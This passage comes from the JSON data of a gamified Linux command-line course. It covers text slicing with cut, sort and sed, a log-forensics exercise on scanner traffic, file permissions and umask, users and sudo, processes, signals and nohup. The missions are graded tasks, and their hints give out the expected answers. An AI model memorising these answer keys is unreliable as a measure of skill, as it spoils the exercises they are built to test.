          "title": "Cut, Sort, Count",
          "tagline": "Slice columns out of structured text.",
          "xp": 100,
          "minutes": 25,
          "boss": false,
          "path": "missions/03-orange-belt/03-cut-sort-count/README.md",
          "intro": "Half of ops life is a CSV, a TSV, or a log with columns. `cut` slices the column you care about; `sort` has tricks you haven't met yet (numeric! by-column!); and the frequency idiom turns columns into insight. The fleet inventory awaits.",
          "learn": [
            {
              "h": "cut: pick a column",
              "code": "cut -d, -f2 fleet.csv        # -d, = comma delimiter, -f2 = field 2\ncut -d: -f1 /etc/passwd      # classic: all usernames on a system\ncut -d, -f1,3 fleet.csv      # several fields at once"
            },
            {
              "h": "Skipping the header line",
              "code": "tail -n +2 fleet.csv         # everything FROM line 2 (+2 = 'starting at 2')\ntail -n +2 fleet.csv | cut -d, -f2   # header-free column",
              "label": "tail -n +N is the idiomatic header-skipper"
            },
            {
              "h": "sort's power flags",
              "code": "sort -n        # numeric (10 after 9, not after 1!)\nsort -r        # reverse\nsort -t, -k3   # -t sets delimiter, -k picks the column to sort BY\nsort -t, -k3 -nr fleet.csv | head -n 3   # top 3 by column 3, numerically",
              "label": "sort by any column"
            },
            {
              "p": "Forgetting `-n` is the classic bug: text sort puts `96` before `100` because `9` > `1` as characters. If a ranking ever looks insane, you text-sorted numbers."
            },
            {
              "tip": "These four — `cut`, `sort`, `uniq -c`, `head` — answer 80% of “quick question about this data” moments faster than opening a spreadsheet."
            }
          ],
          "task": [
            {
              "step": "Build a region frequency table (skip the header!) into `regions.txt`:",
              "code": "tail -n +2 fleet.csv | cut -d, -f2 | sort | uniq -c | sort -nr > regions.txt"
            },
            {
              "step": "Find the machine with the highest CPU (column 3) and write JUST its name into `top-cpu.txt`:",
              "code": "sort -t, -k3 -nr fleet.csv | head -n 1 | cut -d, -f1 > top-cpu.txt"
            },
            {
              "step": "Record two facts in `answers.md`:",
              "code": "eu_west_count=NUMBER\ntotal_machines=NUMBER"
            }
          ],
          "artifacts": [
            [
              "regions.txt",
              "4 lines, biggest region first"
            ],
            [
              "top-cpu.txt",
              "one machine name"
            ],
            [
              "answers.md",
              "eu_west_count and total_machines (header does not count!)"
            ]
          ],
          "hints": [
            "regions.txt should have exactly 4 lines — one per region.",
            "total_machines is data rows only: `tail -n +2 fleet.csv | wc -l`."
          ]
        },
        {
          "id": "3.4",
          "slug": "04-stream-surgeon",
          "title": "Stream Surgeon",
          "tagline": "tr and sed — transform text in flight.",
          "xp": 100,
          "minutes": 25,
          "boss": false,
          "path": "missions/03-orange-belt/04-stream-surgeon/README.md",
          "intro": "Reading and filtering is ninja level one. Level two is *transformation*: renaming a project across a document, fixing a word everywhere, uppercasing a shout. Two scalpels today: `tr` for characters, `sed` for patterns.",
          "learn": [
            {
              "h": "tr — translate characters",
              "code": "tr a-z A-Z < shout.txt        # lowercase → UPPERCASE\ntr -d '0-9' < file            # -d: DELETE all digits\ntr -s ' '   < file            # -s: SQUEEZE runs of spaces into one\ntr ':' '\\n' <<< \"$PATH\"       # turn PATH into one entry per line"
            },
            {
              "p": "Note the `<` — tr reads stdin only; it takes no filename argument. `< file` feeds a file to any command's stdin, the mirror image of `>`."
            },
            {
              "h": "sed — the stream editor",
              "code": "sed 's/PROJECT-X/Nimbus/' draft.md      # replace FIRST match per line\nsed 's/PROJECT-X/Nimbus/g' draft.md     # /g = ALL matches per line\nsed 's|/var/log|/tmp|g' file            # any delimiter works — handy for paths\nsed -n '27p' logbook.txt                # print only line 27",
              "label": "s/find/replace/flags"
            },
            {
              "h": "Editing in place, portably",
              "code": "sed -i.bak 's/linux/Linux/g' release.md   # edits the file, keeps release.md.bak\nrm release.md.bak                          # inspect, then drop the safety net",
              "label": "-i.bak works on BOTH GNU (Linux) and BSD (macOS) sed"
            },
            {
              "p": "Plain `sed -i` differs between GNU and macOS sed (macOS requires an argument). `-i.bak` behaves identically everywhere AND leaves a backup — the dojo standard."
            },
            {
              "tip": "sed does full regex surgery (`^`, `$`, groups with `\\1`) — you'll cut deeper at black belt. Today: substitution mastery."
            }
          ],
          "task": [
            {
              "step": "Uppercase the shout:",
              "code": "tr a-z A-Z < shout.txt > LOUD.txt"
            },
            {
              "step": "The secret project has a public name now. Produce `release.md` from draft.md with every `PROJECT-X` replaced by `Nimbus`:",
              "code": "sed 's/PROJECT-X/Nimbus/g' draft.md > release.md"
            },
            {
              "step": "Marketing bug: lowercase `linux` must be `Linux`. Fix it IN PLACE inside release.md with `sed -i.bak`, then delete the .bak once satisfied."
            },
            {
              "step": "Record in `answers.md` how many times the new name appears:",
              "code": "nimbus_count=NUMBER"
            }
          ],
          "artifacts": [
            [
              "LOUD.txt",
              "the shout, uppercased"
            ],
            [
              "release.md",
              "zero PROJECT-X, zero lowercase linux, no leftover .bak"
            ],
            [
              "answers.md",
              "nimbus_count=…"
            ]
          ],
          "hints": [
            "Count with grep: `grep -c Nimbus release.md` counts LINES — use `grep -o Nimbus release.md | wc -l` to count occurrences.",
            "Draft had capitalized 'Linux' in two places already — those were fine and stay untouched by s/linux/Linux/g."
          ]
        },
        {
          "id": "3.5",
          "slug": "05-boss-log-forensics",
          "title": "BOSS — Log Forensics",
          "tagline": "300 requests. One suspect. Full pipeline forensics.",
          "xp": 250,
          "minutes": 40,
          "boss": true,
          "path": "missions/03-orange-belt/05-boss-log-forensics/README.md",
          "intro": "A web server left you `access.log`: 300 requests of mixed traffic, and somewhere in there, someone probing for weaknesses. This is the orange-belt graduation: every tool from this belt, chained into real forensic conclusions.",
          "learn": [
            {
              "h": "Boss briefing — the log format",
              "code": "IP - - [timestamp] \"METHOD /path HTTP/1.1\" STATUS BYTES\n#^field 1                                  ^field 9 (space-delimited)",
              "label": "Apache-style access log"
            },
            {
              "p": "With space as delimiter: field 1 is the client IP, field 9 the status code. `cut -d' ' -f1` and the frequency idiom will carry you far. A `404` status means *not found* — a burst of 404s on juicy paths (`/admin`, `/.env`) is scanner behavior."
            },
            {
              "h": "Useful moves",
              "code": "cut -d' ' -f1 access.log | sort | uniq -c | sort -nr | head -n 5   # top talkers\ngrep ' 404 ' access.log                                            # all 404s (spaces matter!)\ncut -d' ' -f1 access.log | sort -u | wc -l                         # unique IPs",
              "label": "Your forensic toolkit"
            },
            {
              "tip": "Why ` 404 ` with spaces? Because `404` could appear inside a path or byte count. Anchoring with the surrounding spaces targets the status field. Precision is the difference between evidence and noise."
            }
          ],
          "task": [
            {
              "step": "Create a `report/` directory for your findings."
            },
            {
              "step": "Top 5 IPs by request count → `report/top-5-ips.txt` (frequency-table idiom, head -n 5)."
            },
            {
              "step": "Every 404 line → `report/status-404.txt`."
            },
            {
              "step": "Write `report/findings.md`:",
              "code": "total_requests=?\nunique_ips=?\nerrors_404=?\nsuspect_ip=?\nverdict=ONE_SENTENCE_ABOUT_WHAT_THE_SUSPECT_WAS_DOING"
            }
          ],
          "artifacts": [
            [
              "report/top-5-ips.txt",
              "5 lines, counts + IPs, biggest first"
            ],
            [
              "report/status-404.txt",
              "every 404 request line"
            ],
            [
              "report/findings.md",
              "all five keys, correct values"
            ]
          ],
          "hints": [
            "suspect_ip = the top talker — and look WHAT it requested: `grep 'THAT_IP' access.log | head -20`.",
            "unique_ips: `cut -d' ' -f1 access.log | sort -u | wc -l`.",
            "verdict is free text — say what you concluded (scanning? brute force?). Any non-empty sentence passes."
          ]
        }
      ]
    },
    {
      "n": 4,
      "slug": "04-green-belt",
      "name": "Green Belt",
      "color": "#22c55e",
      "rank": "Gatekeeper",
      "motto": "Permissions are not bureaucracy. They are the locks on every door.",
      "notebook": "Make the permissions table: r=4, w=2, x=1, and the four classics — 755, 700, 644, 600 — with when to use each. In one line: why is `chmod 777` a crime?",
      "side": false,
      "missions": [
        {
          "id": "4.1",
          "slug": "01-nine-bits",
          "title": "The Nine Bits",
          "tagline": "Read any permission string on sight.",
          "xp": 100,
          "minutes": 25,
          "boss": false,
          "path": "missions/04-green-belt/01-nine-bits/README.md",
          "intro": "`-rwxr-xr--`. To a beginner it's line noise. To a Gatekeeper it's a sentence: who owns this, who's in its group, and exactly what each may do. Today you learn to read that sentence instantly — no new commands, just literacy.",
          "learn": [
            {
              "h": "The ten-character string",
              "code": "-rwxr-xr--\n│└┬┘└┬┘└┬┘\n│ │  │  └ OTHER  (everyone else)\n│ │  └──── GROUP\n│ └─────── USER  (the owner)\n└───────── type: - file   d directory   l symlink",
              "label": "1 type bit + 3 groups of 3"
            },
            {
              "h": "Each triad: r, w, x",
              "list": [
                "**r** (read) = 4 — view file contents / list a directory",
                "**w** (write) = 2 — modify a file / create+delete entries in a directory",
                "**x** (execute) = 1 — run a file as a program / *enter* (cd into) a directory",
                "a `-` means that permission is absent"
              ]
            },
            {
              "h": "The octal shorthand",
              "p": "Add the values per triad. `rwx` = 4+2+1 = **7**. `rw-` = 4+2 = **6**. `r-x` = 4+1 = **5**. `r--` = **4**. So `-rwxr-xr--` = **754**. Three digits describe all nine bits. Memorize the common ones: 644 (rw-r--r--, normal file), 755 (rwxr-xr-x, program/dir), 600 (rw-------, private), 640 (rw-r-----, group-readable secret), 700 (private dir)."
            },
            {
              "h": "x on directories is special",
              "p": "On a directory, `x` doesn't mean 'run' — it means 'traverse': you can `cd` in and access known paths, but without `r` you can't *list* it. A `755` directory is the norm: everyone can enter and list; only the owner can add or remove files."
            },
            {
              "h": "The special bits you'll spot",
              "list": [
                "`s` in the user slot (e.g. `-rwsr-xr-x`) — **setuid**: run as the file's owner (how `passwd` edits root-owned files)",
                "`t` at the end of a directory (e.g. `drwxrwxrwt`) — **sticky bit**: in a shared-writable dir, only owners can delete their own files (that's `/tmp`)"
              ]
            },
            {
              "tip": "`ls -l` prints these strings all day. Reading them fluently is a daily-use skill, not trivia."
            }
          ],
          "task": [
            {
              "step": "Study `listing.txt` — a captured `ls -l` output. Decode each line by hand."
            },
            {
              "step": "Answer these in `answers.md` (exact keys):",
              "code": "mode_of_secret=OCTAL_OF_secret.env         # e.g. 640\nowner_of_app=USER_WHO_OWNS_THE_app_FILE\nworld_writable=NAME_OF_THE_FILE_ANYONE_CAN_WRITE\nsticky_dir=THE_DIRECTORY_WITH_THE_STICKY_BIT   # answer with its name\nsymbolic_770=THE_rwx_STRING_FOR_OCTAL_770"
            },
            {
              "step": "For `symbolic_770`: convert 770 back to the nine-character rwx form (no leading type char)."
            }
          ],
          "artifacts": [
            [
              "answers.md",
              "all five keys correct"
            ]
          ],
          "hints": [
            "secret.env shows `-rw-r-----` → user rw (6), group r (4), other none (0) → 640.",
            "The sticky bit is the `t` at the very end of one directory's mode string.",
            "770 = rwx (7) rwx (7) --- (0) = `rwxrwx---`."
          ]
        },
        {
          "id": "4.2",
          "slug": "02-chmod-surgeon",
          "title": "Chmod Surgeon",
          "tagline": "Set permissions with precision — octal and symbolic.",
          "xp": 100,
          "minutes": 25,
          "boss": false,
          "path": "missions/04-green-belt/02-chmod-surgeon/README.md",
          "intro": "Reading locks was 4.1. Now you cut new ones. `chmod` speaks two dialects — octal (absolute) and symbolic (relative) — and a real Gatekeeper is fluent in both, because each wins in different moments.",
          "learn": [
            {
              "h": "Octal mode — set everything at once",
              "code": "chmod 600 vault.txt      # rw-------  (private)\nchmod 644 notes.txt      # rw-r--r--  (normal file)\nchmod 755 script.sh      # rwxr-xr-x  (runnable)\nchmod 770 group-zone/    # rwxrwx---  (owner+group full, others out)"
            },
            {
              "h": "Symbolic mode — adjust relative to what's there",
              "code": "chmod +x script.sh       # add execute for everyone\nchmod u+x script.sh      # add execute for USER only\nchmod g-w file           # remove write from GROUP\nchmod o= file            # set OTHER to nothing\nchmod u=rw,g=r,o= file   # spell each class out (= 640)",
              "label": "u=user g=group o=other a=all  •  + add  - remove  = set exactly"
            },
            {
              "p": "Use **octal** when you know the final state you want ('make it 600'). Use **symbolic** when you want a delta without disturbing the rest ('just add execute'). `chmod +x deploy.sh` is the most-typed chmod on Earth — it makes a script runnable without touching read bits."
            },
            {
              "h": "Making a script executable, then running it",
              "code": "chmod +x runme.sh\n./runme.sh          # the ./ says 'run the file right here'",
              "label": "Why ./ ? Because '.' isn't on your PATH — a security default"
            },
            {
              "h": "Recursive, carefully",
              "code": "chmod -R 755 dir/          # every file AND dir under it\nchmod -R u+X dir/          # capital X = x only where it makes sense (dirs, already-exec files)",
              "label": "-R descends; capital X is the smart-execute trick"
            },
            {
              "tip": "`chmod -R 755` on a tree makes *data files* executable too, which is sloppy. Capital `X` adds execute only to directories and files that already had some execute bit — exactly what you usually mean."
            }
          ],
          "task": [
            {
              "step": "Set `vault.txt` to `600` (owner read/write only)."
            },
            {
              "step": "Set `bulletin.txt` to `644` (owner writes, everyone reads)."
            },
            {
              "step": "Make `runme.sh` executable at `755`, then run it with `./runme.sh` — it should print a success line."
            },
            {
              "step": "Set the directory `group-zone/` to `770`."
            },
            {
              "step": "Verify with `ls -l` and `ls -ld group-zone`. The checker parses the exact modes."
            }
          ],
          "artifacts": [
            [
              "vault.txt",
              "mode 600"
            ],
            [
              "bulletin.txt",
              "mode 644"
            ],
            [
              "runme.sh",
              "mode 755 and runs"
            ],
            [
              "group-zone/",
              "mode 770"
            ]
          ],
          "hints": [
            "`ls -ld group-zone` shows a directory's own mode (without -d it lists the contents).",
            "If `./runme.sh` says 'Permission denied', the execute bit isn't set — recheck the 755."
          ]
        },
        {
          "id": "4.3",
          "slug": "03-masks-and-defaults",
          "title": "Masks and Defaults",
          "tagline": "umask — why new files are born 644.",
          "xp": 100,
          "minutes": 20,
          "boss": false,
          "path": "missions/04-green-belt/03-masks-and-defaults/README.md",
          "intro": "Ever wondered why every file you create starts at 644 and every directory at 755, without you asking? A quiet gatekeeper called `umask` decides. Understand it and you control the defaults instead of fighting them.",
          "learn": [
            {
              "h": "The base and the mask",
              "p": "The system *wants* to create files as 666 (rw for all) and directories as 777. The `umask` then **subtracts** permission bits from that base. The common umask `022` removes write from group and other: 666 − 022 = **644** for files, 777 − 022 = **755** for directories. That's the default you've been seeing all along."
            },
            {
              "h": "Seeing and setting it",
              "code": "umask            # show current mask (e.g. 0022)\numask -S         # show it symbolically (u=rwx,g=rx,o=rx)\numask 077        # new files → 600, new dirs → 700 (private-by-default)\numask 027        # new files → 640, new dirs → 750 (group-friendly, others out)"
            },
            {
              "p": "It's a *mask*, not a subtraction in the arithmetic sense — it clears bits. But for the everyday values (022, 027, 077) the 'base minus mask' mental model gives the right answer every time. `x` is never added to plain files regardless, which is why a new file under umask 022 is 644, not 755."
            },
            {
              "h": "Scope and persistence",
              "p": "`umask` set in a shell affects only files created *afterward*, in *that* shell and its children. To make it permanent, add the `umask` line to your `~/.bashrc`. Servers often set `027` or `077` so freshly written files aren't world-readable by accident."
            },
            {
              "tip": "umask changes the *future*, never the past. Files that already exist keep their modes — use chmod for those."
            }
          ],
          "task": [
            {
              "step": "In your shell, set a private-by-default mask:",
              "code": "umask 077"
            },
            {
              "step": "Create `private-note.txt` with a redirect (`echo \"secret\" > private-note.txt`) — under umask 077 it's born 600."
            },
            {
              "step": "Now switch to a normal mask and create a public file:",
              "code": "umask 022\necho \"public\" > public-note.txt   # born 644"
            },
            {
              "step": "Create a directory `dropbox/` under umask 027 so it lands at 750:",
              "code": "umask 027\nmkdir dropbox"
            },
            {
              "step": "Reason it out and record in `answers.md`:",
              "code": "files_created_with_umask_027=THE_OCTAL_MODE_A_NEW_FILE_GETS   # (666 minus 027)"
            }
          ],
          "artifacts": [
            [
              "private-note.txt",
              "mode 600 (created under umask 077)"
            ],
            [
              "public-note.txt",
              "mode 644 (created under umask 022)"
            ],
            [
              "dropbox/",
              "mode 750 (created under umask 027)"
            ],
            [
              "answers.md",
              "files_created_with_umask_027=…"
            ]
          ],
          "hints": [
            "Set the umask, THEN create the file — order matters, umask only affects future creations.",
            "666 − 027 = 640. That's the answer for the last key.",
            "If a file has the wrong mode, you set the umask after creating it — recreate it (or just chmod it to the target)."
          ]
        },
        {
          "id": "4.4",
          "slug": "04-users-and-sudo",
          "title": "Users, Groups & Sudo",
          "tagline": "Who are you, who can you become, and how the system knows.",
          "xp": 100,
          "minutes": 25,
          "boss": false,
          "path": "missions/04-green-belt/04-users-and-sudo/README.md",
          "intro": "Permissions mean nothing without identity. Today: how Linux stores users and groups in plain text files, what your identity actually *is*, and the careful art of borrowing root's power with `sudo`.",
          "learn": [
            {
              "h": "Who am I, really",
              "code": "whoami        # just the username\nid            # uid, gid, and ALL your groups — the full identity\ngroups        # the groups you belong to\nid -u         # numeric user id only (root is always 0)"
            },
            {
              "h": "/etc/passwd — the user registry (7 colon-separated fields)",
              "code": "tux:x:1000:1000:Tux the Penguin:/home/tux:/bin/bash\n│   │ │    │    │                │          └ login shell\n│   │ │    │    │                └ home directory\n│   │ │    │    └ comment / full name (GECOS)\n│   │ │    └ primary group id (GID)\n│   │ └ user id (UID)\n│   └ password placeholder ('x' = it's in /etc/shadow)\n└ username",
              "label": "Despite the name, no passwords live here anymore"
            },
            {
              "p": "UID 0 is root — absolute power. Regular humans usually start at 1000. A login shell of `/usr/sbin/nologin` or `/bin/false` marks a *service account* that isn't meant to log in (databases, daemons). `/etc/group` maps group names to GIDs and lists extra members."
            },
            {
              "h": "sudo — borrow root for one command",
              "code": "sudo apt update           # run THIS command as root\nsudo -u postgres psql     # run as a specific other user\nsudo -l                   # list what you're allowed to run\nsudo -i                   # start an interactive root shell (careful)"
            },
            {
              "p": "`sudo` beats logging in as root because it's *scoped* (one command), *audited* (every use is logged), and *revocable* (managed in `/etc/sudoers`, edited only via `visudo`). The rule of the craft: use the least power that gets the job done."
            },
            {
              "tip": "This mission reads *sample* copies of passwd/group in `sample/` — you won't touch the real system files. But the format is identical to the real `/etc/passwd`."
            }
          ],
          "task": [
            {
              "step": "Record your own identity: `id > my-id.txt` (must contain a `uid=` field)."
            },
            {
              "step": "Study `sample/passwd` and `sample/group`, then answer in `answers.md`:",
              "code": "root_uid=THE_UID_OF_root\ntux_shell=THE_LOGIN_SHELL_OF_tux\ntux_home=THE_HOME_DIRECTORY_OF_tux\nops_gid=THE_GID_OF_THE_ops_GROUP\nnologin_users=HOW_MANY_ACCOUNTS_USE_nologin_AS_SHELL\npasswd_field_count=HOW_MANY_COLON_SEPARATED_FIELDS_PER_LINE"
            }
          ],
          "artifacts": [
            [
              "my-id.txt",
              "output of id, containing uid="
            ],
            [
              "answers.md",
              "all six keys correct"
            ]
          ],
          "hints": [
            "Fields per line: count the colons and add one — `head -1 sample/passwd` then count.",
            "nologin users: `grep -c nologin sample/passwd`.",
            "ops group GID is the number in the `ops:` line of sample/group."
          ]
        },
        {
          "id": "4.5",
          "slug": "05-boss-operation-lockdown",
          "title": "BOSS — Operation Lockdown",
          "tagline": "Secure a real app directory to production standards.",
          "xp": 250,
          "minutes": 40,
          "boss": true,
          "path": "missions/04-green-belt/05-boss-operation-lockdown/README.md",
          "intro": "A developer shipped an app folder with everything world-readable — secrets included. Your job, Gatekeeper: lock it down to production hygiene. Right permissions on the right files, scripts runnable, secrets unreadable, and a written rationale.",
          "learn": [
            {
              "h": "Boss briefing — the hardening standard",
              "list": [
                "Secrets (`config/secrets.env`) → **600**: only the owner may read. A leaked secret is the whole game.",
                "Config that services read (`config/app.conf`) → **640**: owner writes, group reads, others blind.",
                "Executables (`bin/*.sh`) → **755**: everyone may run, only owner may edit.",
                "Public assets (`public/*`) → **644**: readable by all, that's their job.",
                "Data directory (`data/`) → **750**: owner full, group may enter, others out."
              ]
            },
            {
              "h": "Doing it efficiently",
              "code": "chmod 755 app/bin/*.sh          # glob hits every script at once\nchmod 644 app/public/*         # all public assets\nchmod 750 app/data             # the directory itself\nls -lR app                     # audit the whole tree afterward",
              "label": "Glob per class, then verify"
            },
            {
              "tip": "The written 'why' matters as much as the chmod. In a real review, 'secrets are 600 because a world-readable credential is a breach' is the sentence that gets you hired."
            }
          ],
          "task": [
            {
              "step": "Apply the standard above to everything under `app/`."
            },
            {
              "step": "Make `app/bin/start.sh` runnable and execute it (`./app/bin/start.sh`) — it prints a startup line proving the execute bit works."
            },
            {
              "step": "Write `app/SECURITY.md` documenting your decisions:",
              "code": "secrets_env=600\nbin_scripts=755\ndata_dir=750\nwhy=ONE_SENTENCE_ON_WHY_SECRETS_ARE_600"
            },
            {
              "step": "Audit with `ls -lR app` and confirm every mode matches the standard."
            }
          ],
          "artifacts": [
            [
              "app/config/secrets.env",
              "mode 600"
            ],
            [
              "app/config/app.conf",
              "mode 640"
            ],
            [
              "app/bin/*.sh",
              "mode 755, and start.sh runs"
            ],
            [
              "app/public/*",
              "mode 644"
            ],
            [
              "app/data/",
              "mode 750"
            ],
            [
              "app/SECURITY.md",
              "four keys, why is a non-empty sentence"
            ]
          ],
          "hints": [
            "Do the scripts with a glob: `chmod 755 app/bin/*.sh`.",
            "`ls -ld app/data` to check the directory's own mode is 750.",
            "'why' just needs to be a real sentence — e.g. 'A world-readable credential file is a breach waiting to happen.'"
          ]
        }
      ]
    },
    {
      "n": 5,
      "slug": "05-blue-belt",
      "name": "Blue Belt",
      "color": "#3b82f6",
      "rank": "Process Tamer",
      "motto": "Every command is a process. Learn to see them, signal them, and outlast them.",
      "notebook": "Explain SIGTERM vs SIGKILL with your own metaphor. Note the admin's triage trio you keep reaching for: check status → read the logs → restart.",
      "side": false,
      "missions": [
        {
          "id": "5.1",
          "slug": "01-see-the-machine",
          "title": "See the Machine",
          "tagline": "ps and top — make the invisible running system visible.",
          "xp": 100,
          "minutes": 25,
          "boss": false,
          "path": "missions/05-blue-belt/01-see-the-machine/README.md",
          "intro": "Right now, dozens of processes are alive on your machine — shells, services, the very terminal you're reading this in. A Process Tamer's first skill is *sight*: listing what runs, who owns it, and what it's costing.",
          "learn": [
            {
              "h": "ps — a snapshot of processes",
              "code": "ps               # just YOUR processes in this terminal\nps aux           # EVERY process, detailed (the classic incantation)\nps -ef           # every process, different columns (PPID = parent!)\nps aux | grep nginx    # filter for what you care about",
              "label": "aux and -ef are the two you'll actually type"
            },
            {
              "h": "Reading ps aux columns",
              "list": [
                "**USER** — who owns the process",
                "**PID** — process id, its unique handle (you signal processes by PID)",
                "**%CPU / %MEM** — current resource share",
                "**STAT** — state: `R` running, `S` sleeping, `Z` zombie, `T` stopped",
                "**COMMAND** — what's actually running"
              ]
            },
            {
              "h": "PID 1 and the family tree",
              "p": "Every process has a parent (PPID). The chain climbs to **PID 1** — the init system (`systemd` on most distros) that the kernel starts first and that adopts orphans. `ps -ef` shows PPIDs so you can trace who launched what — vital when hunting something suspicious."
            },
            {
              "h": "top / htop — the live dashboard",
              "code": "top       # live, refreshing view (press q to quit, M sort by memory, P by cpu)\nhtop      # friendlier colored version, if installed",
              "label": "ps is a photo; top is the video"
            },
            {
              "h": "Zombies, briefly",
              "p": "A **zombie** (`Z`, `<defunct>`) is a finished process whose parent hasn't collected its exit status yet. It holds no resources but clutters the table; a pile of them signals a buggy parent. You can't kill a zombie — it's already dead."
            },
            {
              "tip": "Your own shell has a PID too. `echo $$` prints it — the shell's special variable for 'my own process id'."
            }
          ],
          "task": [
            {
              "step": "Capture a snapshot of all processes into `snapshot.txt`:",
              "code": "ps aux > snapshot.txt"
            },
            {
              "step": "Record your current shell's PID into `my-shell-pid.txt`:",
              "code": "echo $$ > my-shell-pid.txt"
            },
            {
              "step": "A captured `sample/ps.txt` is provided (so answers are identical for everyone). Study it and answer in `answers.md`:",
              "code": "biggest_memory_pid=PID_WITH_THE_HIGHEST_%MEM\nzombie_pid=PID_IN_STATE_Z\ninit_pid=PID_OF_/sbin/init"
            }
          ],
          "artifacts": [
            [
              "snapshot.txt",
              "your real ps aux output (has a PID header + many lines)"
            ],
            [
              "my-shell-pid.txt",
              "one number — your shell PID"
            ],
            [
              "answers.md",
              "three PIDs read from sample/ps.txt"
            ]
          ],
          "hints": [
            "In sample/ps.txt, %MEM is column 4. The java process is the memory hog.",
            "The zombie is the line with STAT `Z` and `<defunct>`.",
            "init is PID 1 by universal convention."
          ]
        },
        {
          "id": "5.2",
          "slug": "02-signal-path",
          "title": "The Signal Path",
          "tagline": "kill, signals, and the difference between asking and forcing.",
          "xp": 100,
          "minutes": 30,
          "boss": false,
          "path": "missions/05-blue-belt/02-signal-path/README.md",
          "intro": "`kill` is badly named — it really means 'send a signal'. Most signals are polite requests a program may handle or ignore; one cannot be refused. Today you meet a stubborn daemon and learn the whole spectrum from 'please stop' to 'stop NOW'.",
          "learn": [
            {
              "h": "Signals are messages, not murders",
              "code": "kill 4242            # send the DEFAULT signal (TERM) to PID 4242\nkill -15 4242        # TERM explicitly — 'please shut down cleanly'\nkill -TERM 4242      # same thing, by name\nkill -9 4242         # KILL — the un-ignorable, un-catchable hammer\nkill -2 4242         # INT — what Ctrl+C sends\nkill -1 4242         # HUP — often 'reload your config'",
              "label": "-15 asks nicely; -9 does not ask"
            },
            {
              "h": "The three you must know",
              "list": [
                "**SIGTERM (15)** — the default. 'Please clean up and exit.' A well-behaved program flushes files, closes sockets, then quits. *Always try this first.*",
                "**SIGKILL (9)** — cannot be caught, blocked, or ignored. The kernel destroys the process instantly. No cleanup — risk of corrupt state. *Last resort.*",
                "**SIGHUP (1)** — historically 'terminal hung up'; today many daemons treat it as 'reload config without restarting'."
              ]
            },
            {
              "h": "Why a program can ignore TERM",
              "p": "Programs install *signal handlers* — code that runs when a signal arrives. A handler can catch TERM and decide to log it and keep running (databases do this to finish writing safely). SIGKILL is special precisely because the kernel never delivers it to the program at all — there's nothing to catch. That's why `-9` always wins."
            },
            {
              "h": "Finding the PID to signal",
              "code": "pgrep -f naughty_daemon      # PIDs whose command matches\npkill -f naughty_daemon      # signal them by name (TERM by default)\npkill -9 -f naughty_daemon   # force by name",
              "label": "pgrep/pkill save you the ps|grep dance"
            },
            {
              "tip": "Escalate, don't lead with force: TERM, wait a moment, and only then KILL. Leading with `-9` on a database is how you learn about corrupt data the hard way."
            }
          ],
          "task": [
            {
              "step": "Launch the stubborn daemon in the background:",
              "code": "./naughty_daemon.sh &"
            },
            {
              "step": "Confirm it's alive and note its PID (it also writes `daemon.pid`):",
              "code": "cat daemon.pid\nps aux | grep naughty_daemon"
            },
            {
              "step": "Politely ask it to stop with SIGTERM — then check `daemon.log`. You'll see it *ignored* you (it has a handler).",
              "code": "kill -15 $(cat daemon.pid)\ncat daemon.log"
            },
            {
              "step": "Now end it for real with the un-ignorable signal:",
              "code": "kill -9 $(cat daemon.pid)"
            },
            {
              "step": "Confirm it's gone (`ps aux | grep naughty_daemon` shows nothing but grep), then record in `answers.md`:",
              "code": "polite_signal=15                # the name TERM is also accepted\nunstoppable_signal=9"
            }
          ],
          "artifacts": [
            [
              "daemon.log",
              "shows the daemon started AND logged ignoring SIGTERM"
            ],
            [
              "daemon.pid",
              "the PID — and that process must NO LONGER be running"
            ],
            [
              "answers.md",
              "polite_signal and unstoppable_signal"
            ]
          ],
          "hints": [
            "The daemon writes its own PID to daemon.pid, so `kill $(cat daemon.pid)` always targets it.",
            "If it won't die, you're sending TERM (which it ignores). Use `kill -9`.",
            "`polite_signal` accepts either `15` or `TERM`; `unstoppable_signal` is `9`."
          ]
        },
        {
          "id": "5.3",
          "slug": "03-jobs-and-nohup",
          "title": "Jobs & Nohup",
          "tagline": "Background, foreground, and surviving logout.",
          "xp": 100,
          "minutes": 25,
          "boss": false,
          "path": "missions/05-blue-belt/03-jobs-and-nohup/README.md",
          "intro": "One terminal, many tasks. Job control lets you pause a job, shove it to the background, pull it back — and `nohup`/`&` let a task outlive the terminal that started it. Essential the first time an SSH session drops mid-job.",
          "learn": [
            {
              "h": "Background and foreground",
              "code": "./slow_task.sh &     # start in the BACKGROUND (& = don't wait)\njobs                 # list this shell's jobs\nfg %1                # bring job 1 to the FOREGROUND\nbg %1                # resume a stopped job in the background",
              "label": "& detaches; jobs/fg/bg manage them"
            },
            {
              "h": "The Ctrl+Z dance",
              "list": [
                "**Ctrl+C** — send INT, terminate the foreground job",
                "**Ctrl+Z** — send TSTP, *suspend* it (frozen, not dead)",
                "then **`bg`** — resume it in the background, or **`fg`** — resume in foreground"
              ]
            },
            {
              "p": "So the rescue for 'oops, this is taking forever and blocking my terminal' is: **Ctrl+Z** to suspend, then **`bg`** to let it run detached while you keep working."
            },
            {
              "h": "Surviving logout: nohup and &",
              "code": "nohup ./slow_task.sh &        # immune to HUP; keeps running after logout\n# stdout/stderr are saved to ./nohup.out automatically\nnohup ./slow_task.sh > run.log 2>&1 &   # send output where you want",
              "label": "nohup = no hangup"
            },
            {
              "p": "When a terminal closes, the kernel sends **SIGHUP** to its jobs — normally killing them. `nohup` makes a command ignore HUP, so `nohup cmd &` keeps running after you log out. (`tmux`/`screen` solve this more richly, but nohup is everywhere and needs nothing installed.)"
            },
            {
              "h": "Redirecting both streams",
              "code": "cmd > out.log 2>&1 &\n#          └ 2>&1 = 'send stderr to wherever stdout is going'",
              "label": "Capture normal output AND errors together"
            },
            {
              "tip": "`2>&1` order matters: it means 'stderr follows stdout's current destination', so it must come *after* the `>`. A daily-driver idiom worth memorizing."
            }
          ],
          "task": [
            {
              "step": "Run the slow task with nohup in the background, capturing output to `slow.log` (the script writes there itself):",
              "code": "nohup ./slow_task.sh > /dev/null 2>&1 &"
            },
            {
              "step": "While it runs, prove you understand job control: start a `sleep 30`, press Ctrl+Z to suspend it, then `bg` to background it, then confirm with `jobs`."
            },
            {
              "step": "Wait for the task to finish (about 10s), then confirm `slow.log` ends with a `done` line: `tail slow.log`."
            },
            {
              "step": "Record the concepts in `answers.md`:",
              "code": "pause_key=THE_KEY_COMBO_THAT_SUSPENDS_A_JOB    # e.g. ctrl+z\nresume_bg=THE_COMMAND_THAT_RESUMES_IN_BACKGROUND   # one word\nhup_immune=THE_COMMAND_THAT_SURVIVES_LOGOUT        # one word"
            }
          ],
          "artifacts": [
